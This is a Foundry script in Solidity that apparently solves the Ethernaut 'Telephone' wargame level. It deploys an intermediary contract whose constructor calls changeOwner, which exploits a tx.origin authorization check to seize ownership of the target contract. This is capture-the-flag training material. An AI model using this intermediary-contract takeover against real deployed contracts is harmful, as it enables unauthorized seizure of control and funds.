// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import {Telephone} from "src/Telephone.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract Player {
    constructor(Telephone _telephoneInstance, address _newOwner) {
        _telephoneInstance.changeOwner(_newOwner);
    }
}

contract TelephoneSolution is Script {
    Telephone public telephone =
        Telephone(0xA04d929Aab816Dd5EB1F20e3467aCF5877145FCB);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        new Player(telephone, vm.envAddress("MY_ADDRESS"));
        vm.stopBroadcast();
    }
}
